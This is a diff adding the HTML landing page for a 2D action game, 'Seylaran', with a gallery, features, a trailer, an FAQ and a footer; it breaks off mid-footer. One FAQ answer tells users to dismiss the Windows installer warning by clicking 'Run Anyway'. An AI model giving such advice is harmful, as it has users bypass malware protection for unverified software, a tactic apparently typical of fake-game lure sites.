@@ -1,0 +1,1223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Embark on an epic journey through a shattered world. Master blade combat, explore forgotten realms, and restore balance to a universe torn asunder.">
+    <meta property="og:title" content="Seylaran - Epic 2D Action Adventure">
+    <meta property="og:description" content="Experience a hand-crafted adventure where every strike matters. Download now and begin your quest to mend the broken threads of reality.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://Seylaran.com">
+    <meta property="og:site_name" content="by Narimo Studios">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Seylaran - Epic 2D Action Adventure">
+    <meta name="twitter:description" content="Experience a hand-crafted adventure where every strike matters. Download now and begin your quest to mend the broken threads of reality.">
+    <link rel="icon" type="image/png" href="images/ico.jpg">
+    
+    <title>Seylaran | Official Site</title>
+    
+    <!-- External Resources -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+JP:wght@300;400;500;700;900&family=Shippori+Mincho:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Design System Configuration -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        sakura: {
+                            pink: '#ffb7d5',
+                            light: '#ffe5f0',
+                            dark: '#d48fa8',
+                        },
+                        torii: {
+                            red: '#c41e3a',
+                            dark: '#8b0000',
+                            bright: '#ff4444',
+                        },
+                        washi: {
+                            paper: '#f5f1e8',
+                            cream: '#e8ddd4',
+                        },
+                        sumi: {
+                            ink: '#1a1a1a',
+                            dark: '#0d0d0d',
+                            light: '#2d2d2d',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Noto Serif JP', 'serif'],
+                        display: ['Shippori Mincho', 'serif'],
+                    },
+                    animation: {
+                        'sakura-fall': 'sakuraFall 15s linear infinite',
+                        'sakura-float': 'sakuraFloat 8s ease-in-out infinite',
+                        'torii-glow': 'toriiGlow 3s ease-in-out infinite alternate',
+                    },
+                    keyframes: {
+                        sakuraFall: {
+                            '0%': { transform: 'translateY(-100vh) rotate(0deg) translateX(0px)', opacity: '0' },
+                            '10%': { opacity: '1' },
+                            '90%': { opacity: '1' },
+                            '100%': { transform: 'translateY(100vh) rotate(720deg) translateX(100px)', opacity: '0' }
+                        },
+                        sakuraFloat: {
+                            '0%, 100%': { transform: 'translateY(0px) rotate(0deg)' },
+                            '50%': { transform: 'translateY(-30px) rotate(180deg)' }
+                        },
+                        toriiGlow: {
+                            '0%': { boxShadow: '0 0 20px rgba(196, 30, 58, 0.5)' },
+                            '100%': { boxShadow: '0 0 40px rgba(196, 30, 58, 0.8)' }
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        /* Global Reset */
+        body { 
+            background: linear-gradient(180deg, #0d0d0d 0%, #1a1a1a 50%, #0d0d0d 100%);
+            color: #f5f1e8; 
+            overflow-x: hidden;
+            font-family: 'Noto Serif JP', serif;
+        }
+
+        /* Smooth Scroll */
+        html {
+            scroll-behavior: smooth;
+            scroll-padding-top: 70px;
+        }
+
+        /* Sakura Petal Container */
+        .sakura-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 30;
+            overflow: hidden;
+        }
+
+        .sakura-petal {
+            position: absolute;
+            background: #ffb7d5;
+            border-radius: 100% 0 100% 0;
+            opacity: 0.8;
+            box-shadow: 0 0 10px rgba(255, 183, 213, 0.5);
+            will-change: transform;
+        }
+        
+        @keyframes sakuraFall {
+            0% { 
+                transform: translateY(-10vh) rotate(0deg) translateX(0px); 
+                opacity: 0; 
+            }
+            5% { 
+                opacity: 0.8; 
+            }
+            95% { 
+                opacity: 0.8; 
+            }
+            100% { 
+                transform: translateY(110vh) rotate(360deg) translateX(50px); 
+                opacity: 0; 
+            }
+        }
+
+        /* Paper Texture */
+        .paper-texture {
+            background-image: 
+                repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(245, 241, 232, 0.03) 2px, rgba(245, 241, 232, 0.03) 4px);
+        }
+
+        /* Torii Gate Decoration */
+        .torii-decoration {
+            position: relative;
+        }
+        .torii-decoration::before {
+            content: '⛩';
+            position: absolute;
+            font-size: 8rem;
+            opacity: 0.05;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 0;
+        }
+
+        /* Japanese Pattern Overlay */
+        .japanese-pattern {
+            background-image: 
+                radial-gradient(circle at 2px 2px, rgba(196, 30, 58, 0.1) 1px, transparent 0);
+            background-size: 40px 40px;
+        }
+
+        /* Loader */
+        .loader-circle {
+            width: 60px;
+            height: 60px;
+            border: 3px solid rgba(196, 30, 58, 0.2);
+            border-top-color: #c41e3a;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Fade In */
+        .fade-in {
+            opacity: 0;
+            transform: translateY(40px);
+            transition: opacity 1s ease, transform 1s ease;
+        }
+        .fade-in.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0d0d0d; }
+        ::-webkit-scrollbar-thumb { 
+            background: linear-gradient(180deg, #c41e3a, #ffb7d5);
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover { background: #c41e3a; }
+
+        /* Japanese Button Style */
+        .btn-japanese {
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        .btn-japanese::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        .btn-japanese:hover::before {
+            left: 100%;
+        }
+
+        /* Vertical Text */
+        .vertical-text {
+            writing-mode: vertical-rl;
+            text-orientation: upright;
+        }
+
+        /* FAQ Content Animation - Optimized */
+        .faq-content {
+            will-change: max-height, opacity;
+            transition: max-height 0.5s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        /* Modal Content Container */
+        #modal-content {
+            position: relative;
+        }
+
+        /* Modal View - Simple, no animation */
+        .modal-view {
+            display: block;
+        }
+        .modal-view.hidden {
+            display: none;
+        }
+
+        /* Modal Overlay Blur Fix - Pre-rendered Blur */
+        #modal-overlay {
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+            /* Force GPU acceleration and pre-render blur */
+            will-change: opacity, visibility;
+            transform: translateZ(0);
+            /* Blur is pre-rendered and never changes */
+        }
+        #modal-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+            visibility: hidden;
+            /* Blur stays constant - pre-rendered, never removed */
+        }
+        #modal-overlay:not(.hidden) {
+            opacity: 1;
+            visibility: visible;
+            /* Blur stays constant - pre-rendered, always applied */
+        }
+
+        /* Card Hover */
+        .card-japanese {
+            transition: all 0.4s ease;
+            position: relative;
+        }
+        .card-japanese::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border: 2px solid #c41e3a;
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+        .card-japanese:hover::after {
+            opacity: 1;
+        }
+        .card-japanese:hover {
+            transform: translateY(-5px);
+        }
+
+        /* Sidebar Tooltip */
+        .nav-tooltip {
+            position: relative;
+        }
+        .nav-tooltip::after {
+            content: attr(data-tooltip);
+            position: absolute;
+            left: 100%;
+            top: 50%;
+            transform: translateY(-50%);
+            margin-left: 15px;
+            padding: 6px 12px;
+            background: #c41e3a;
+            color: #f5f1e8;
+            font-size: 12px;
+            font-weight: bold;
+            white-space: nowrap;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+            z-index: 100;
+            border: 1px solid #ffb7d5;
+        }
+        .nav-tooltip:hover::after {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body class="antialiased selection:bg-torii-red selection:text-washi-paper">
+
+    <div class="sakura-container" id="sakura-layer"></div>
+    <div class="fixed inset-0 japanese-pattern opacity-20 pointer-events-none z-0"></div>
+    <div class="fixed inset-0 paper-texture pointer-events-none z-0"></div>
+
+    <!-- Loader -->
+    <div id="loader" class="fixed inset-0 z-[100] bg-sumi-dark flex flex-col justify-center items-center transition-opacity duration-700">
+        <div class="loader-circle mb-6"></div>
+        <span class="text-sm font-display tracking-widest text-torii-red">Loading...</span>
+    </div>
+
+    <!-- Navigation - Vertical Sidebar Style -->
+    <nav id="navbar" class="fixed top-0 left-0 h-full w-20 z-50 bg-sumi-ink/90 backdrop-blur-md border-r border-torii-red/20 flex flex-col items-center py-8">
+        <a href="#" class="mb-12 group">
+            <div class="w-12 h-12 border-2 border-torii-red/50 p-1 group-hover:border-torii-red transition-colors">
+                <img src="images/ico.jpg" alt="Seylaran" class="w-full h-full object-cover grayscale group-hover:grayscale-0 transition-all">
+            </div>
+        </a>
+
+        <div class="flex flex-col gap-8 flex-1">
+            <a href="#gallery" class="nav-tooltip text-torii-red/60 hover:text-torii-red transition-colors text-xl" data-tooltip="GALLERY">
+                <i class="fa-solid fa-images"></i>
+            </a>
+            <a href="#features" class="nav-tooltip text-torii-red/60 hover:text-torii-red transition-colors text-xl" data-tooltip="FEATURES">
+                <i class="fa-solid fa-star"></i>
+            </a>
+            <a href="#trailer" class="nav-tooltip text-torii-red/60 hover:text-torii-red transition-colors text-xl" data-tooltip="TRAILER">
+                <i class="fa-solid fa-play"></i>
+            </a>
+            <a href="#prologue" class="nav-tooltip text-torii-red/60 hover:text-torii-red transition-colors text-xl" data-tooltip="STORY">
+                <i class="fa-solid fa-book"></i>
+            </a>
+            <a href="#faq" class="nav-tooltip text-torii-red/60 hover:text-torii-red transition-colors text-xl" data-tooltip="FAQ">
+                <i class="fa-solid fa-question"></i>
+            </a>
+        </div>
+
+        <button onclick="openModal()" class="mt-8 w-10 h-10 border-2 border-torii-red/50 text-torii-red/60 hover:text-torii-red hover:border-torii-red transition-all flex items-center justify-center text-lg">
+            <i class="fa-solid fa-download"></i>
+        </button>
+
+        <!-- Mobile Menu Button -->
+        <button id="mobile-toggle" class="md:hidden absolute top-4 right-4 text-torii-red text-2xl">
+            <i class="fa-solid fa-bars"></i>
+        </button>
+    </nav>
+
+    <!-- Mobile Menu Overlay -->
+    <div id="mobile-menu" class="fixed inset-0 bg-sumi-dark z-40 transform translate-x-full transition-transform duration-300 flex flex-col items-center justify-center gap-8">
+        <button id="mobile-close" class="absolute top-8 right-8 text-3xl text-torii-red">&times;</button>
+        <a href="#gallery" class="text-2xl font-display text-washi-paper hover:text-torii-red mobile-link transition-colors">Gallery</a>
+        <a href="#features" class="text-2xl font-display text-washi-paper hover:text-torii-red mobile-link transition-colors">Features</a>
+        <a href="#trailer" class="text-2xl font-display text-washi-paper hover:text-torii-red mobile-link transition-colors">Trailer</a>
+        <a href="#prologue" class="text-2xl font-display text-washi-paper hover:text-torii-red mobile-link transition-colors">Story</a>
+        <a href="#faq" class="text-2xl font-display text-washi-paper hover:text-torii-red mobile-link transition-colors">FAQ</a>
+        <button onclick="openModal()" class="px-10 py-4 bg-torii-red text-washi-paper font-display text-lg font-bold mobile-link">Download</button>
+    </div>
+
+    <!-- Main Content with Left Margin for Sidebar -->
+    <div class="ml-20">
+
+        <!-- Hero Section - Right Aligned Image -->
+        <section class="relative min-h-screen flex items-center overflow-hidden pt-16">
+            <div class="absolute inset-0 z-0">
+                <div class="absolute inset-0 bg-[url('images/banner.png')] bg-cover bg-center opacity-15"></div>
+                <div class="absolute inset-0 bg-gradient-to-l from-sumi-dark via-sumi-ink/80 to-transparent"></div>
+            </div>
+
+            <div class="container mx-auto px-8 md:px-20 relative z-10">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
+                    <!-- Text Content - Left -->
+                    <div class="fade-in order-2 lg:order-1">
+                        <div class="mb-6">
+                            <span class="inline-block px-4 py-2 bg-torii-red/20 border-l-4 border-torii-red text-torii-red text-xs font-bold tracking-widest uppercase">
+                                Closed Beta Available
+                            </span>
+                        </div>
+                        
+                        <h1 class="text-5xl md:text-7xl lg:text-8xl font-display font-bold mb-8 leading-tight">
+                            <span class="text-torii-red">AWAKEN</span><br>
+                            <span class="text-washi-paper">THE LEGEND</span>
+                        </h1>
+                        
+                        <p class="text-washi-paper/80 text-lg md:text-xl mb-12 leading-relaxed max-w-lg">
+                            Enter a beautifully hand-drawn 2D realm where every blade strike echoes through time. Master ancient combat techniques, traverse ethereal landscapes, and fight to weave back the torn fabric of reality itself.
+                        </p>
+
+                        <div class="flex flex-col sm:flex-row gap-4">
+                            <button onclick="openModal()" class="px-8 py-4 bg-torii-red text-washi-paper font-bold text-base hover:bg-torii-bright transition-all transform hover:scale-105 flex items-center justify-center gap-3 btn-japanese">
+                                <i class="fa-brands fa-windows"></i>
+                                <span>Download</span>
+                            </button>
+                            <a href="#trailer" class="px-8 py-4 border-2 border-torii-red/50 text-torii-red font-bold text-base hover:bg-torii-red/10 transition-all flex items-center justify-center gap-3">
+                                <i class="fa-solid fa-play"></i>
+                                <span>Watch Trailer</span>
+                            </a>
+                        </div>
+                    </div>
+
+                    <!-- Image - Right -->
+                    <div class="relative fade-in order-1 lg:order-2">
+                        <div class="absolute -inset-8 border-2 border-torii-red/30"></div>
+                        <div class="absolute -inset-4 border border-sakura-pink/30"></div>
+                        <img src="images/3.jpg" alt="Gameplay" class="relative w-full h-auto border-4 border-sumi-light">
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Gallery Section - First, Grid Layout -->
+        <section id="gallery" class="py-24 bg-sumi-ink relative">
+            <div class="container mx-auto px-8 md:px-20">
+                <div class="text-center mb-16 fade-in">
+                    <span class="inline-block px-4 py-2 bg-sakura-pink/20 border border-sakura-pink/50 text-sakura-pink text-xs font-bold tracking-widest uppercase mb-4">
+                        Art Gallery
+                    </span>
+                    <h2 class="text-4xl md:text-5xl font-display font-bold text-washi-paper mb-4">World Showcase</h2>
+                </div>
+
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
+                    <div class="col-span-2 md:col-span-2 row-span-2 relative group cursor-pointer card-japanese fade-in overflow-hidden" onclick="openGalleryLightbox()">
+                        <div id="gallery-img" class="w-full h-full min-h-[400px] bg-cover bg-center transition-opacity duration-700 group-hover:opacity-90 border-2 border-sumi-light"></div>
+                        <div class="absolute bottom-0 left-0 w-full p-6 bg-gradient-to-t from-sumi-dark to-transparent">
+                            <span id="gallery-subtitle" class="text-sakura-pink text-xs font-bold tracking-widest block mb-2">SCENE 01</span>
+                            <h3 id="gallery-title" class="text-2xl font-display font-bold text-washi-paper">The Fallen Shrine</h3>
+                        </div>
+                    </div>
+                    <div class="relative group cursor-pointer card-japanese fade-in overflow-hidden" onclick="setGallerySlide(1)">
+                        <img src="images/2.jpg" alt="Gallery" class="w-full h-full object-cover border-2 border-sumi-light transition-opacity duration-700 group-hover:opacity-90">
+                    </div>
+                    <div class="relative group cursor-pointer card-japanese fade-in overflow-hidden" onclick="setGallerySlide(2)">
+                        <img src="images/3.jpg" alt="Gallery" class="w-full h-full object-cover border-2 border-sumi-light transition-opacity duration-700 group-hover:opacity-90">
+                    </div>
+                    <div class="relative group cursor-pointer card-japanese fade-in overflow-hidden" onclick="setGallerySlide(3)">
+                        <img src="images/4.jpg" alt="Gallery" class="w-full h-full object-cover border-2 border-sumi-light transition-opacity duration-700 group-hover:opacity-90">
+                    </div>
+                    <div class="relative group cursor-pointer card-japanese fade-in overflow-hidden" onclick="setGallerySlide(0)">
+                        <img src="images/5.jpg" alt="Gallery" class="w-full h-full object-cover border-2 border-sumi-light transition-opacity duration-700 group-hover:opacity-90">
+                    </div>
+                </div>
+
+                <div class="flex justify-center gap-4">
+                    <button id="prev-slide" class="w-12 h-12 border-2 border-torii-red/50 text-torii-red hover:bg-torii-red hover:text-washi-paper transition-all flex items-center justify-center">
+                        <i class="fa-solid fa-chevron-left"></i>
+                    </button>
+                    <button id="next-slide" class="w-12 h-12 border-2 border-torii-red/50 text-torii-red hover:bg-torii-red hover:text-washi-paper transition-all flex items-center justify-center">
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Features Section - Vertical Stack -->
+        <section id="features" class="py-24 bg-sumi-dark relative border-y border-torii-red/20">
+            <div class="container mx-auto px-8 md:px-20 max-w-4xl">
+                <div class="text-center mb-16 fade-in">
+                            <span class="inline-block px-4 py-2 bg-torii-red/20 border border-torii-red/50 text-torii-red text-xs font-bold tracking-widest uppercase mb-4">
+                        Gameplay Systems
+                    </span>
+                    <h2 class="text-4xl md:text-5xl font-display font-bold text-washi-paper">Key Features</h2>
+                </div>
+
+                <div class="space-y-6">
+                    <div class="p-8 bg-sumi-ink border-l-4 border-torii-red card-japanese fade-in">
+                        <div class="flex items-start gap-6">
+                            <div class="w-16 h-16 bg-torii-red/20 border-2 border-torii-red flex items-center justify-center flex-shrink-0">
+                                <i class="fa-solid fa-khanda text-2xl text-torii-red"></i>
+                            </div>
+                            <div>
+                                <h3 class="text-2xl font-display font-bold text-washi-paper mb-3">
+                                    Masterful Combat
+                                </h3>
+                                <p class="text-washi-paper/70 leading-relaxed">
+                                    Experience deeply satisfying swordplay where timing and precision reign supreme. Parry enemy attacks with perfect timing and unleash devastating counter-strikes that flow like water.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="p-8 bg-sumi-ink border-l-4 border-sakura-pink card-japanese fade-in" style="transition-delay: 100ms;">
+                        <div class="flex items-start gap-6">
+                            <div class="w-16 h-16 bg-sakura-pink/20 border-2 border-sakura-pink flex items-center justify-center flex-shrink-0">
+                                <i class="fa-solid fa-map-location-dot text-2xl text-sakura-pink"></i>
+                            </div>
+                            <div>
+                                <h3 class="text-2xl font-display font-bold text-washi-paper mb-3">Vast Realm Exploration</h3>
+                                <p class="text-washi-paper/70 leading-relaxed">
+                                    Wander through an expansive, non-linear world filled with secrets waiting to be uncovered. Discover hidden pathways, unlock new abilities, and access remote areas that reward the curious.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="p-8 bg-sumi-ink border-l-4 border-torii-red card-japanese fade-in" style="transition-delay: 200ms;">
+                        <div class="flex items-start gap-6">
+                            <div class="w-16 h-16 bg-torii-red/20 border-2 border-torii-red flex items-center justify-center flex-shrink-0">
+                                <i class="fa-solid fa-paintbrush text-2xl text-torii-red"></i>
+                            </div>
+                            <div>
+                                <h3 class="text-2xl font-display font-bold text-washi-paper mb-3">Stunning Visual Art</h3>
+                                <p class="text-washi-paper/70 leading-relaxed">
+                                    Immerse yourself in a world brought to life through traditional animation techniques and breathtaking particle effects that make every scene a masterpiece.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Trailer Section - Centered, Smaller -->
+        <section id="trailer" class="py-24 bg-sumi-ink relative torii-decoration">
+            <div class="container mx-auto px-8 md:px-20 max-w-4xl relative z-10">
+                <div class="text-center mb-12 fade-in">
+                    <span class="inline-block px-4 py-2 bg-sakura-pink/20 border border-sakura-pink/50 text-sakura-pink text-xs font-bold tracking-widest uppercase mb-4">
+                        Watch Now
+                    </span>
+                    <h2 class="text-4xl md:text-5xl font-display font-bold text-washi-paper">Official Trailer</h2>
+                </div>
+                <div class="relative border-4 border-torii-red/50 fade-in">
+                    <div class="aspect-video w-full bg-sumi-dark">
+                        <iframe class="w-full h-full" src="https://streamable.com/e/rmxozg" frameborder="0" allowfullscreen></iframe>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Prologue Section - Bottom, Different Layout -->
+        <section id="prologue" class="py-24 bg-sumi-dark relative">
+            <div class="container mx-auto px-8 md:px-20">
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-12">
+                    <!-- Stats -->
+                    <div class="fade-in">
+                        <div class="border-t-4 border-torii-red pt-6">
+                            <span class="block text-4xl font-display font-bold text-torii-red mb-2">Visuals</span>
+                            <span class="text-sm text-washi-paper/60 uppercase tracking-wider">Hand-Drawn</span>
+                        </div>
+                    </div>
+                    <div class="fade-in" style="transition-delay: 100ms;">
+                        <div class="border-t-4 border-sakura-pink pt-6">
+                            <span class="block text-4xl font-display font-bold text-sakura-pink mb-2">Fighting</span>
+                            <span class="text-sm text-washi-paper/60 uppercase tracking-wider">Skill-Based</span>
+                        </div>
+                    </div>
+                    <div class="fade-in" style="transition-delay: 200ms;">
+                        <div class="border-t-4 border-torii-red pt-6">
+                            <span class="block text-4xl font-display font-bold text-torii-red mb-2">Lore</span>
+                            <span class="text-sm text-washi-paper/60 uppercase tracking-wider">Deep World</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-16 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+                    <div class="fade-in">
+                        <span class="inline-block px-4 py-2 bg-torii-red/20 border-l-4 border-torii-red text-torii-red text-xs font-bold tracking-widest uppercase mb-6">
+                            Story
+                        </span>
+                        <h2 class="text-4xl md:text-5xl font-display font-bold mb-6">
+                            <span class="text-torii-red">The Shattered</span><br>
+                            <span class="text-washi-paper">World</span>
+                        </h2>
+                        <div class="space-y-4 text-washi-paper/80 leading-relaxed">
+                            <p>
+                                The once-stable realm of Seylaran now teeters on the edge of oblivion. Ancient seals that once preserved the cosmic order have shattered, allowing malevolent forces to pour into reality like ink into water.
+                            </p>
+                            <p>
+                                You stand as the last hope, a chosen warrior who must traverse these corrupted lands. Battle through beautifully crafted ruins, confront twisted creatures born from the void, and piece together the truth behind this cataclysmic event.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="relative fade-in">
+                        <div class="absolute -inset-6 border-2 border-sakura-pink/30"></div>
+                        <img src="images/6.jpg" alt="Story" class="relative w-full h-auto border-4 border-sumi-light">
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- FAQ Section - Side Panel Style -->
+        <section id="faq" class="py-24 bg-sumi-ink border-t border-torii-red/20">
+            <div class="container mx-auto px-8 md:px-20 max-w-3xl">
+                <div class="text-center mb-16 fade-in">
+                    <span class="inline-block px-4 py-2 bg-sakura-pink/20 border border-sakura-pink/50 text-sakura-pink text-xs font-bold tracking-widest uppercase mb-4">
+                        Support
+                    </span>
+                    <h2 class="text-4xl md:text-5xl font-display font-bold text-washi-paper">Frequently Asked</h2>
+                </div>
+                
+                <div class="space-y-3">
+                    <div class="bg-sumi-dark border-l-4 border-torii-red p-6 fade-in">
+                        <button class="w-full flex justify-between items-center text-left text-washi-paper hover:text-torii-red transition-colors faq-btn group">
+                            <span class="font-bold">Is multiplayer co-op available in the game?</span>
+                            <i class="fa-solid fa-plus text-torii-red transform transition-transform duration-300"></i>
+                        </button>
+                        <div class="faq-content overflow-hidden max-h-0 opacity-0">
+                            <div class="pt-4 text-washi-paper/70 text-sm leading-relaxed">
+                                Yes, you can join forces with another player in cooperative mode. Team up to tackle challenges together and share your adventure.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-sumi-dark border-l-4 border-sakura-pink p-6 fade-in">
+                        <button class="w-full flex justify-between items-center text-left text-washi-paper hover:text-sakura-pink transition-colors faq-btn group">
+                            <span class="font-bold">Windows is warning me about the installer. Is it safe?</span>
+                            <i class="fa-solid fa-plus text-sakura-pink transform transition-transform duration-300"></i>
+                        </button>
+                        <div class="faq-content overflow-hidden max-h-0 opacity-0">
+                            <div class="pt-4 text-washi-paper/70 text-sm leading-relaxed">
+                                The warning appears because our installer isn't digitally signed yet. It's completely safe. Select "More Info" then choose "Run Anyway" to proceed with installation.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-sumi-dark border-l-4 border-torii-red p-6 fade-in">
+                        <button class="w-full flex justify-between items-center text-left text-washi-paper hover:text-torii-red transition-colors faq-btn group">
+                            <span class="font-bold">What are the minimum system requirements?</span>
+                            <i class="fa-solid fa-plus text-torii-red transform transition-transform duration-300"></i>
+                        </button>
+                        <div class="faq-content overflow-hidden max-h-0 opacity-0">
+                            <div class="pt-4 text-washi-paper/70 text-sm leading-relaxed">
+                                Minimum specs include Windows 10 or later, a processor equivalent to Intel Core i3, and 4GB RAM. The game runs smoothly on most modern systems.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-sumi-dark border-l-4 border-sakura-pink p-6 fade-in">
+                        <button class="w-full flex justify-between items-center text-left text-washi-paper hover:text-sakura-pink transition-colors faq-btn group">
+                            <span class="font-bold">Do controllers work with the game?</span>
+                            <i class="fa-solid fa-plus text-sakura-pink transform transition-transform duration-300"></i>
+                        </button>
+                        <div class="faq-content overflow-hidden max-h-0 opacity-0">
+                            <div class="pt-4 text-washi-paper/70 text-sm leading-relaxed">
+                                Controller support is fully implemented. Xbox and PlayStation gamepads work perfectly, with vibration feedback and all features enabled.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-sumi-dark border-l-4 border-torii-red p-6 fade-in">
+                        <button class="w-full flex justify-between items-center text-left text-washi-paper hover:text-torii-red transition-colors faq-btn group">
+                            <span class="font-bold">Will my progress be saved in the cloud?</span>
+                            <i class="fa-solid fa-plus text-torii-red transform transition-transform duration-300"></i>
+                        </button>
+                        <div class="faq-content overflow-hidden max-h-0 opacity-0">
+                            <div class="pt-4 text-washi-paper/70 text-sm leading-relaxed">
+                                Your save files automatically upload to cloud storage. This means you can continue your journey on any device without losing progress.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-sumi-dark border-l-4 border-sakura-pink p-6 fade-in">
+                        <button class="w-full flex justify-between items-center text-left text-washi-paper hover:text-sakura-pink transition-colors faq-btn group">
+                            <span class="font-bold">Is the game free to play?</span>
+                            <i class="fa-solid fa-plus text-sakura-pink transform transition-transform duration-300"></i>
+                        </button>
+                        <div class="faq-content overflow-hidden max-h-0 opacity-0">
+                            <div class="pt-4 text-washi-paper/70 text-sm leading-relaxed">
+                                Currently, Seylaran is in Closed Beta and completely free. If you are invited, you can download it now and experience the full game at no cost! :)
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="bg-sumi-ink pt-20 pb-12 border-t-4 border-torii-red/30 relative overflow-hidden">
+            <!-- Decorative Elements -->
+            <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-torii-red/50 to-transparent"></div>
+            <div class="absolute top-10 right-10 opacity-10">
+                <i class="fa-solid fa-torii-gate text-[12rem] text-torii-red"></i>
+            </div>
+            
+            <div class="container mx-auto px-8 md:px-20 relative z-10">
+                <!-- Main Footer Content -->
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-12 mb-12">
+                    <!-- Left Column - Game Info -->
+                    <div class="lg:col-span-2">
+                        <div class="mb-8">
+                            <h2 class="text-4xl md:text-5xl font-display font-bold mb-3">
+                                <span class="text-torii-red">Play</span>
+                                <span class="text-washi-paper"> Seylaran</span>
+                            </h2>
+                            <div class="w-24 h-1 bg-gradient-to-r from-torii-red to-sakura-pink mb-6"></div>
+                            <p class="text-washi-paper/70 text-base leading-relaxed max-w-lg">
+                                Start your journey today. Download the latest Windows version and dive into an unforgettable experience.
+                            </p>
+                        </div>
+                        
+                        <div class="flex flex-col gap-1.5 text-sm w-fit">
+                            <div class="flex items-center gap-1.5 px-2 py-1 bg-sumi-dark/50 border border-green-400/30 rounded w-fit">
+                                <span class="w-1.5 h-1.5 bg-green-400 rounded-full animate-pulse shadow-lg shadow-green-400/50"></span>
+                                <span class="text-washi-paper font-semibold text-xs">Servers Online</span>
+                            </div>
+                            <div class="px-2 py-1 bg-sumi-dark/50 border border-sakura-pink/30 rounded flex items-center gap-1.5 w-fit">
+                                <span id="player-count-loader" class="hidden w-2.5 h-2.5 border-2 border-sakura-pink/50 border-t-sakura-pink rounded-full animate-spin"></span>
+                                <span class="text-washi-paper/80 text-xs">
+                                    <span class="text-sakura-pink font-bold" id="player-count">??</span>
+                                    <span class="text-washi-paper/60"> players online</span>
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Right Column - Social & Copyright -->
+                    <div class="flex flex-col justify-between">
+                        <div>
+                            <h3 class="text-lg font-display font-bold text-torii-red mb-4 uppercase tracking-wider">Connect</h3>
+                            <div class="flex gap-4 mb-6">
+                                <a href="https://discord.gg/MXMakJS" class="group w-14 h-14 bg-sumi-dark border-2 border-torii-red/50 rounded-lg flex items-center justify-center text-torii-red hover:bg-torii-red hover:text-washi-paper transition-all transform hover:scale-110">
+                                    <i class="fa-brands fa-discord text-2xl"></i>
+                                </a>
+                                <a href="https://www.youtube.com/@NarimoStudios" class="group w-14 h-14 bg-sumi-dark border-2 border-torii-red/50 rounded-lg flex items-center justify-center text-torii-red hover:bg-torii-red hover:text-washi-paper transition-all transform hover:scale-110">
+                                    <i class="fa-brands fa-youtube text-2xl"></i>
+                                </a>
+                            </div>
+                            
+                            <button onclick="openModal()" class="group relative w-full px-6 py-4 bg-gradient-to-r from-torii-red to-torii-bright text-washi-paper font-bold text-base hover:shadow-2xl hover:shadow-torii-red/50 transition-all transform hover:scale-105 flex items-center gap-3 btn-japanese">
+                                <i class="fa-brands fa-windows text-xl"></i>
+                                <div class="text-left flex-1">
